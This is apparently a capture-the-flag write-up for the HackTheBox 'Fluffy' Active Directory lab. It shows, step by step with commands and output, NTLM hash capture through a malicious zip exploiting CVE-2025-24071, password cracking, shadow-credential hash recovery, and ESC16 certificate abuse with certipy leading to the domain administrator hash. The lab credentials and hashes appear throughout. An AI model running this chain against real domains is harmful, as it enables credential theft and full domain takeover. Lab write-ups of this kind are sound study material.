## HOST RECON

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 03:57:07Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T03:58:32+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-05-25T03:58:30+00:00; +7h00m03s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T03:58:32+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T03:58:30+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-25T03:57:52
|_  start_date: N/A
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
```


#### user enum

```
└─$ netexec smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --users
...
Administrator
Guest
krbtgt
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```


## bh data

```
- j.fleischman ---> no outboud path

- j.coffey ---> memberof ---> Service Account Managers
  |__ outbound --->  Service Account Managers members has GenericAllover Service Accounts

The members of the group SERVICE ACCOUNT MANAGERS@FLUFFY.HTB have GenericAll permissions to the group SERVICE ACCOUNTS@FLUFFY.HTB.

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

Full control of a group allows you to directly modify group membership of the group.


- winrm_svc ---> memberof ---> Remote Management Users, Service Accounts
  |__ outbound ---> Service Accounts members has GenericWrite over ldap_svc and ca_svc accounts

The members of the group SERVICE ACCOUNTS@FLUFFY.HTB have generic write access to the user CA_SVC@FLUFFY.HTB.

Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

 Targeted Kerberoast,  Shadow Credentials attack 


- p.agile ---> memberof---> Service Account Managers, Service Accounts
  |__ outbound ---> Service Accounts members has GenericWrite over ldap_svc, ca_svc, winrm_svc accounts (same winrm_svc outbound)


- ldap_svc ---> memberof --->  Service Accounts
  |__ outbound ---> same winrm_svc


- ca_svc ---> memberof ---> Service Accounts, Denied Rodc Password Replication Group, Cert Publishers
  |__ outbound ---> same winrm_svc
```  


#### smb IT share has read and write perms

```
└─$ netexec smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --timeout 3000 --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```

```
└─$ smbclient //10.10.11.69/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 25 23:39:37 2025
  ..                                  D        0  Sun May 25 23:39:37 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```

- Upgrade_Notice.pdf


```
CVE-2025-24996 - Critical
CVE-2025-24071 - Critical
CVE-2025-46785 - High
CVE-2025-29968 - High
CVE-2025-21193 - Medium
CVE-2025-3445 - Low
```


## CVE-2025-24071

- smb share with RW perms + some zip file in IT share
- https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
- https://github.com/0x6rss/CVE-2025-24071_PoC

- foothold: upload malicious zip file and get ntlm hash with responder

- responder not work, start a impacket smb server

- loggin smb IT share and upload exploit.zip
```
└─$ smbclient //10.10.11.69/IT -U j.fleischman

...

smb: \> put exploit.zip exploit.zip
putting file exploit.zip as \exploit.zip (0.7 kb/s) (average 0.3 kb/s)
```
- 

```
└─$ impacket-smbserver share . -smb2support

...

[*] Incoming connection (10.10.11.69,64443)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:7f37fe65b61f2dc3be0cd2c1e3e13802:01010000000000008053c3e6efcddb017d127a39c6545e58000000000100100072005000410047004800580065006800030010007200500041004700480058006500680002001000540054006800410062004100530073000400100054005400680041006200410053007300070008008053c3e6efcddb01060004000200000008003000300000000000000001000000002000001d81419fd8a2d75efd02a15a9e86e467f0412a6f90838343ef9886c3f2276edf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200330030000000000000000000
[*] Closing down connection (10.10.11.69,64443)
```

- crack hash

```
└─$ john p.agila_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 

prometheusx-303  (p.agila)     
```

## p.aglia creds

- checking shadow credentials in service accounts

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```
```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
22151d74ba3de931a352cba1f9393a37
```
```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

```
└─$ netexec smb 10.10.11.69 -u ldap_svc -H 22151d74ba3de931a352cba1f9393a37     
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\ldap_svc:22151d74ba3de931a352cba1f9393a37 
                                                                                                                                                                                             

└─$ netexec smb 10.10.11.69 -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 
```

## ca_svc

- ESC16 ADCS vulnerability

```
└─$ certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable


Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

#### ESC16 ADCS

- https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

- update UPN of ca_svc

```
└─$ certipy account update -dc-ip 10.10.11.69 -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn administrator@fluffy.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

- verify update

```
└─$ certipy account read -dc-ip 10.10.11.69 -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc                                
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-26T12:05:23+00:00
```

- request certificate as administrator

```
└─$ certipy req -dc-ip 10.10.11.69 -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'       
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

-  revert the UPN change

```
└─$ certipy account update -dc-ip 10.10.11.69 -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn ca_svc@fluffy.htb                    
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

- auth using administrator certificate

```
└─$ faketime -f +7hr certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69 -domain fluffy.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
